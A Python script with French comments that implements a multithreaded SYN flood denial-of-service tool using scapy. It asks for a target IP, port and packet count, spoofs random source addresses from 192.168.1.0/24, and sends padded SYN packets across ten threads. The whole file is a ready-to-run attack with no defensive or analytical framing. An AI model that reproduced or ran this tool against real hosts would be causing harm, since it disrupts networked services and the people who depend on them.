from scapy.all import *
import ipaddress
from threading import Thread

class Syn_attack:
    def send_syn_packets(self, ip, port, nb_paquets, progress_callback):
        # Fonction pour construire et envoyer les paquets SYN
        for _ in range(nb_paquets):
            ip_packet = IP(src=RandIP("192.168.1.1/24"), dst=ip)
            tcp_packet = TCP(sport=RandShort(), dport=port, flags="S")
            raw_data = Raw(b"X" * 1024)
            send(ip_packet / tcp_packet / raw_data, verbose=False)
            progress_callback()  # Signaler la progression après chaque envoi

    def valider_ip(self):
        ip = input("Veuillez entrer une adresse IP cible : ")
        try:
            ipaddress.ip_address(ip)  # Valide l'adresse IP
            return ip
        except ValueError:
            print("Adresse IP invalide.")
            return self.valider_ip()

    def valider_port(self):
        while True:
            port = input("Veuillez entrer le port cible : ")
            try:
                port = int(port)
                if 0 < port < 65536:  # Vérifie si le port est dans la plage valide
                    return port
                else:
                    print("Le port doit être compris entre 1 et 65535.")
            except ValueError:
                print("Veuillez entrer un nombre entier pour le port.")

    def valider_nombre_paquets(self):
        while True:
            nb_paquets = input("Veuillez entrer le nombre de paquets à envoyer : ")
            try:
                nb_paquets = int(nb_paquets)
                if nb_paquets > 0:
                    return nb_paquets
                else:
                    print("Le nombre de paquets doit être supérieur à zéro.")
            except ValueError:
                print("Veuillez entrer un nombre entier valide.")

    def attaque_syn(self):
        ip = self.valider_ip()
        port = self.valider_port()  # Demander le port cible
        nb_paquets = self.valider_nombre_paquets()

        # Fonction de callback pour suivre la progression de l'attaque
        def update_progress():
            self.progress += 1
            percentage = (self.progress / nb_paquets) * 100
            if percentage % 5 == 0:  # Afficher la progression toutes les 5%
                print(f"{percentage:.2f}% des paquets envoyés.")

        # Division du travail en plusieurs threads
        self.progress = 0
        num_threads = 10  # Nombre de threads pour l'envoi des paquets
        packets_per_thread = nb_paquets // num_threads
        threads = []

        # Création et démarrage des threads
        for _ in range(num_threads):
            thread = Thread(target=self.send_syn_packets, args=(ip, port, packets_per_thread, update_progress))
            thread.start()
            threads.append(thread)

        # Attendre que tous les threads se terminent
        for thread in threads:
            thread.join()

# Utilisation de la classe Syn_attack pour lancer l'attaque SYN
Con = Syn_attack()
Con.attaque_syn()
